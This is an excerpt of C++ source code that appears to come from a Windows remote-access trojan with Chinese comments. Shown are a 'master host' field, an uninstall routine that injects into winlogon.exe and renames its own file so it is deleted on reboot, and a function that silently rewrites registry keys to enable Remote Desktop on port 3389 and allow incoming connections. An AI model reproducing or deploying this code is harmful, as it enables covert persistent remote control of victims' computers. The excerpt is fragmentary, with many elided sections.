...
TCHAR	CKernelManager::m_strMasterHost[256] = { 0 };
...
void CKernelManager::UnInstallService()
{
    ...
    // 装文件随机改名，重启时删除
    wsprintf(strRandomFile, TEXT("%d.bak"), GetTickCount());
    ...
    CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
    CKeyboardManager::Mylstrcat(strRecordFile, TEXT("\\desktop.inf"));
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    ...
    {
        InjectRemoveService(TEXT("winlogon.exe"), m_strServiceName);
    }
...
{
    DWORD Port = 3389;
    CreateStringReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache"), TEXT("Enabled"), TEXT("0"));
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"), TEXT("EnableAdminTSRemote"), 0x00000001);
    CreateStringReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), TEXT("ShutdownWithoutLogon"), TEXT("0"));
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), TEXT("TSEnabled"), 0x00000001);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\TermDD"), TEXT("Start"), 0x00000002);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\TermService"), TEXT("Start"), 0x00000002);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), TEXT("fDenyTSConnections"), 0x00000001);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp"), TEXT("PortNumber"), Port);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"), TEXT("PortNumber"), Port);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp"), TEXT("PortNumber"), Port);
    CreateStringReg(HKEY_USERS, TEXT(".DEFAULT\\Keyboard Layout\\Toggle"), TEXT("Hotkey"), TEXT("2"));
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), TEXT("fDenyTSConnections"), 0x00000000);
    return;
}

void CKernelManager::CreateStringReg(HKEY hRoot, TCHAR *szSubKey, TCHAR* ValueName, TCHAR *Data)
{
    HKEY hKey;
    //打开注册表键，不存在则创建它
    ...
    //修改注册表键值，没有则创建它
    lRet = RegSetValueEx(hKey, ValueName, 0, REG_SZ, (BYTE*)Data, _tcslen(Data));
    if (lRet != ERROR_SUCCESS)
    {
        return;
    }
...
//用于修改数字类型键值
void CKernelManager::MyCreateDWORDReg(HKEY hRoot, TCHAR *szSubKey, TCHAR* ValueName, DWORD Data)
{
    HKEY hKey;
    //打开注册表键，不存在则创建它
    long lRet = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
